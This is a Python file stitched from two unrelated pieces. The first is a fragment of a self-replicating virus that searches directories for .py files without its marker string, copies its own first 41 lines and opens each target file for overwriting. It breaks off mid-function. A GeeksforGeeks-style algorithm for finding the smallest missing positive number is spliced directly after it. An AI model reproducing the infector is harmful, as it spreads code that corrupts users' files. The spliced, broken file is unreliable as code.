#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
''' Python3 program to find the
smallest positive missing number '''

''' Utility function that puts all
non-positive (0 and negative) numbers on left
side of arr[] and return count of such numbers '''
def segregate(arr, size):
	j = 0
	for i in range(size):
		if (arr[i] <= 0):
			arr[i], arr[j] = arr[j], arr[i]
			j += 1 # increment count of non-positive integers
	return j


''' Find the smallest positive missing number
in an array that contains all positive integers '''
def findMissingPositive(arr, size):
	
	# Mark arr[i] as visited by
	# making arr[arr[i] - 1] negative.
	# Note that 1 is subtracted
	# because index start
	# from 0 and positive numbers start from 1
	for i in range(size):
		if (abs(arr[i]) - 1 < size and arr[abs(arr[i]) - 1] > 0):
			arr[abs(arr[i]) - 1] = -arr[abs(arr[i]) - 1]
			
	# Return the first index value at which is positive
	for i in range(size):
		if (arr[i] > 0):
			
			# 1 is added because indexes start from 0
			return i + 1
	return size + 1

''' Find the smallest positive missing
number in an array that contains
both positive and negative integers '''
def findMissing(arr, size):
	
	# First separate positive and negative numbers
	shift = segregate(arr, size)
	
	# Shift the array and call findMissingPositive for
	# positive part
	return findMissingPositive(arr[shift:], size - shift)
	
# Driver code
arr = [ 0, 10, 2, -10, -20 ]
arr_size = len(arr)
missing = findMissing(arr, arr_size)
print("The smallest positive missing number is ", missing)

# This code is contributed by Shubhamsingh10
# Time Complexity: O(n)
# Space complexity: O(1)